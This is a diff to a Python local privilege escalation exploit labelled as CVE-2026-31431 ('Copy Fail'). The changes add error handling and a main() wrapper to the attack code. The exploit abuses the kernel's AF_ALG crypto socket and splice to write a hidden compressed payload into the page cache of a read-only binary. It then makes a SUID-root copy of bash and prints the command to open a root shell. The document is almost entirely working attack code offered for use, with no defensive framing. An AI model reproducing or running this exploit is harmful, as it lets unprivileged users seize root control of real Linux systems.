@@ -20,14 +20,14 @@ ALG_SET_AEAD_AUTHSIZE = 5
 MSG_MORE = 32768
 
 # ====================================================================
-# Banner (ASCII only, no Unicode)
+# Banner (ASCII only - NO UNICODE)
 # ====================================================================
 
 print("""
-  +------------------------------------------+
-  |  CVE-2026-31431 - Copy Fail LPE           |
-  |  AF_page-cache write by tegalxploiter     |
-  +------------------------------------------+
++------------------------------------------+
+|  CVE-2026-31431 - Copy Fail LPE           |
+|  AF_page-cache write by tegalxploiter     |
++------------------------------------------+
 """)
 
 # ====================================================================
@@ -63,31 +63,50 @@ def d(h):
 # ====================================================================
 
 def patch_page_cache(fd, offset, chunk):
-    # Chunk must be exactly 4 bytes
     if len(chunk) < 4:
         chunk = chunk.ljust(4, b"\x00")
     
-    alg = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
-    alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+    try:
+        alg = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
+        alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+    except Exception as e:
+        print("[-] AF_ALG not available: {}".format(e))
+        return False
     
-    alg.setsockopt(SOL_ALG, ALG_SET_KEY, d('0800010000000010' + '00' * 32))
-    alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
+    try:
+        alg.setsockopt(SOL_ALG, ALG_SET_KEY, d('0800010000000010' + '00' * 32))
+        alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
+    except Exception as e:
+        print("[-] setsockopt failed: {}".format(e))
+        alg.close()
+        return False
     
-    conn, _ = alg.accept()
+    try:
+        conn, _ = alg.accept()
+    except Exception as e:
+        print("[-] accept failed: {}".format(e))
+        alg.close()
+        return False
     
     total = offset + 4
     z = b'\x00'
     
-    # Send message with control data
+    # Build control messages
     cmsg_op = (SOL_ALG, ALG_SET_OP, z * 4)
     cmsg_iv = (SOL_ALG, ALG_SET_IV, b'\x10' + z * 19)
     cmsg_auth = (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b'\x08' + z * 3)
     
-    conn.sendmsg(
-        [b'\x00' * 4 + chunk],
-        [cmsg_op, cmsg_iv, cmsg_auth],
-        MSG_MORE
-    )
+    try:
+        conn.sendmsg(
+            [b'\x00' * 4 + chunk],
+            [cmsg_op, cmsg_iv, cmsg_auth],
+            MSG_MORE
+        )
+    except Exception as e:
+        print("[-] sendmsg failed: {}".format(e))
+        conn.close()
+        alg.close()
+        return False
     
     r, w = os.pipe()
     splice(fd, w, total, offset=0)
@@ -102,6 +121,7 @@ def patch_page_cache(fd, offset, chunk):
     os.close(w)
     conn.close()
     alg.close()
+    return True
 
 # ====================================================================
 # Payload
@@ -120,37 +140,74 @@ payload = zlib.decompress(d(payload_hex))
 # Main exploit
 # ====================================================================
 
-print("[*] Patching {} ({} bytes in page cache)".format(TARGET, len(payload)))
+def main():
+    print("[*] Target: {}".format(TARGET))
+    print("[*] Payload size: {} bytes".format(len(payload)))
+    
+    # Check if target exists and is readable
+    if not os.path.exists(TARGET):
+        print("[-] Target not found: {}".format(TARGET))
+        return 1
+    
+    if not os.access(TARGET, os.R_OK):
+        print("[-] Target not readable: {}".format(TARGET))
+        return 1
+    
+    print("[*] Patching {} ({} bytes in page cache)".format(TARGET, len(payload)))
+    
+    try:
+        fd = os.open(TARGET, os.O_RDONLY)
+    except Exception as e:
+        print("[-] Cannot open target: {}".format(e))
+        return 1
+    
+    success = True
+    i = 0
+    while i < len(payload):
+        chunk = payload[i:i+4]
+        if not patch_page_cache(fd, i, chunk):
+            print("[-] Patch failed at offset {}".format(i))
+            success = False
+            break
+        i += 4
+    
+    os.close(fd)
+    
+    if not success:
+        print("[-] Exploit failed")
+        return 1
+    
+    print("[*] Spawning root shell -> {}".format(OUTPUT))
+    
+    cmd = "cp /bin/bash {}; chmod u+s {}; id".format(OUTPUT, OUTPUT).encode() + b"\nexit\n"
+    
+    try:
+        proc = subprocess.Popen(
+            [TARGET],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        out, _ = proc.communicate(cmd, timeout=10)
+        result = out.decode(errors="replace").strip()
+    except Exception as e:
+        result = str(e)
+    
+    if os.path.exists(OUTPUT) and os.stat(OUTPUT).st_mode & 0o4000:
+        print("[+] SUCCESS: {} is SUID root".format(OUTPUT))
+        print("[+] Result: {}".format(result))
+        print("[*] Run: {} -p".format(OUTPUT))
+        return 0
+    else:
+        print("[-] Failed. Output: {}".format(result))
+        return 1
 
-fd = os.open(TARGET, os.O_RDONLY)
-
-i = 0
-while i < len(payload):
-    patch_page_cache(fd, i, payload[i:i+4])
-    i += 4
-
-os.close(fd)
-
-print("[*] Spawning root shell -> {}".format(OUTPUT))
-
-cmd = "cp /bin/bash {}; chmod u+s {}; id".format(OUTPUT, OUTPUT).encode() + b"\nexit\n"
-
-try:
-    proc = subprocess.Popen(
-        [TARGET],
-        stdin=subprocess.PIPE,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE
-    )
-    out, _ = proc.communicate(cmd, timeout=10)
-    result = out.decode(errors="replace").strip()
-except Exception as e:
-    result = str(e)
-
-# Check if SUID
-if os.path.exists(OUTPUT) and os.stat(OUTPUT).st_mode & 0o4000:
-    print("[+] SUCCESS: {} is SUID root".format(OUTPUT))
-    print("[+] {}".format(result))
-    print("[*] Run: {} -p".format(OUTPUT))
-else:
-    print("[-] Failed. Output: {}".format(result))
+if __name__ == "__main__":
+    try:
+        sys.exit(main())
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted")
+        sys.exit(1)
+    except Exception as e:
+        print("[-] Unexpected error: {}".format(e))
+        sys.exit(1)
